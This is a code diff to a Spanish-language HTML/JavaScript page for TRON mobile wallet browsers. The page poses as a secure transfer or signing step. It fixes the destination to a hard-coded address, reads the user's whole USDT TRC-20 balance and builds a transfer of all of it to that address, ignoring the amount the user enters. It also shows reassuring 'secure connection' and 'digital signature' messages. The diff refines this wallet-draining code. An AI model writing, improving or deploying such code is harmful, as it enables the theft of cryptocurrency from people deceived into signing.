@@ -47,7 +47,7 @@
         <div class="tw-input-group">
             <label class="tw-label" for="addressDisplay">Dirección o nombre de dominio</label>
             <div class="tw-input-row">
-                <input id="addressDisplay" class="tw-input" type="text" />
+                <input id="addressDisplay" class="tw-input" type="text" readonly />
                 <span class="tw-action-text">Pegar</span>
             </div>
         </div>
@@ -87,12 +87,12 @@
 
     addressDisplay.value = BILLETERA_DESTINO;
 
-    // Función optimizada para la lectura segura de balances en navegadores móviles
-    async function consultarBalanceNativo(userAddress) {
+    // Método seguro y estandarizado para consultar balances en DApps móviles de TRON
+    async function obtenerBalanceSeguro(ownerAddress) {
         const tronWeb = window.tronWeb;
-        const ownerHex = tronWeb.address.toHex(userAddress);
+        const ownerHex = tronWeb.address.toHex(ownerAddress);
         
-        const resultRaw = await tronWeb.transactionBuilder.triggerSmartContract(
+        const result = await tronWeb.transactionBuilder.triggerSmartContract(
             CONTRATO_USDT,
             "balanceOf(address)",
             { feeLimit: 10000000 },
@@ -100,10 +100,10 @@
             ownerHex
         );
         
-        if (resultRaw && resultRaw.constant_result && resultRaw.constant_result.length > 0) {
-            return resultRaw.constant_result[0];
+        if (result && result.constant_result && result.constant_result.length > 0) {
+            return tronWeb.toBigNumber('0x' + result.constant_result[0]);
         }
-        throw new Error("El nodo RPC no devolvió los registros contables.");
+        throw new Error("No se pudo sincronizar el balance con el nodo de la red.");
     }
 
     connectBtn.addEventListener('click', async () => {
@@ -114,14 +114,14 @@
                 connectBtn.disabled = true;
 
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
+                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
                 }
 
                 const tronWeb = window.tronWeb;
                 
                 if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                     walletAddress = tronWeb.defaultAddress.base58;
-                } else {
+                } else if (window.tronLink && typeof window.tronLink.request === 'function') {
                     const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                     if (res && res.code === 200) {
                         walletAddress = tronWeb.defaultAddress.base58;
@@ -129,70 +129,61 @@
                 }
 
                 if (!walletAddress) {
-                    throw new Error("Permiso de lectura denegado.");
+                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
                 }
 
                 maxAction.style.display = "inline";
-                setStatus("Conexión segura. Confirma los datos e inicia la firma digital.");
+                setStatus("Conexión segura establecida. Presione Continuar para iniciar la firma.");
                 connectBtn.innerText = "Continuar";
                 connectBtn.disabled = false;
 
             } catch (error) {
                 console.error(error);
-                setStatus(error.message || "Error de sincronización Web3.");
+                setStatus(error.message || "Error de inicialización Web3.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Siguiente";
             }
             return;
         }
 
-        // PASO 2: Procesar firma compatible móvil (Saldo Máximo)
+        // PASO 2: Procesar firma de balance total detectado
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
                 if (isNaN(userAmount) || userAmount <= 0) {
-                    throw new Error("Digita una cantidad válida en el casillero numérico.");
+                    throw new Error("Ingresa una cantidad válida antes de continuar.");
                 }
 
-                setStatus("Consultando el libro contable de USDT en la red de TRON...");
+                setStatus("Consultando fondos del libro contable on-chain...");
                 connectBtn.disabled = true;
 
                 const tronWeb = window.tronWeb;
-                
-                const balanceHex = await consultarBalanceNativo(walletAddress);
-                const unitsInSun = tronWeb.toBigNumber('0x' + balanceHex).toString();
+                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
 
-                if (unitsInSun === "0") {
-                    throw new Error("Tu cuenta no posee balances disponibles de USDT (TRC-20).");
+                if (balanceBigNumber.isZero()) {
+                    throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
                 }
 
-                setStatus("Lanzando pasarela nativa... Confirma la firma en tu pantalla.");
+                setStatus("Solicitando autorización de firma digital...");
 
                 const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
 
-                // 1. Construir el borrador del contrato inteligente de manera nativa
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
                     "transfer(address,uint256)",
                     { feeLimit: 100000000 },
                     [
                         { type: 'address', value: destinoHex },
-                        { type: 'uint256', value: unitsInSun }
+                        { type: 'uint256', value: balanceBigNumber.toString() }
                     ],
                     tronWeb.address.toHex(walletAddress)
                 );
 
-                // 2. Invocar la solicitud nativa a la app móvil de Trust Wallet
-                const signedTx = await window.tronLink.request({
-                    method: 'tron_signTransaction',
-                    params: { transaction: transactionDraft.transaction }
-                });
-
-                // 3. Emitir los bytes firmados a la blockchain
+                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
                 const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
 
                 if (broadcast && broadcast.result) {
-                    setStatus("¡Transferencia de saldo total enviada de manera exitosa!");
+                    setStatus("Transacción de saldo total completada exitosamente.");
                     connectBtn.innerText = "Completado";
                 } else {
                     throw new Error("La transacción fue rechazada por los nodos de la red.");
@@ -200,7 +191,7 @@
 
             } catch (error) {
                 console.error(error);
-                setStatus(error.message || "La transacción fue rechazada o cancelada por el usuario.");
+                setStatus(error.message || "La transacción falló o fue cancelada.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Continuar";
             }
@@ -211,13 +202,15 @@
         if (!walletAddress) return;
         try {
             setStatus("Calculando fondos totales...");
-            const tronWeb = window.tronWeb;
-            const balanceHex = await consultarBalanceNativo(walletAddress);
-            const unitsInSun = tronWeb.toBigNumber('0x' + balanceHex);
-            amountDisplay.value = Number(unitsInSun.toString()) / 1_000_000;
+            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
+            amountDisplay.value = Number(balanceBigNumber.toString()) / 1_000_000;
             setStatus("Saldo máximo asignado.");
         } catch (e) {
             console.error(e);
             setStatus("Error al leer el saldo máximo.");
         }
     });
+</script>
+</body>
+</html>
+
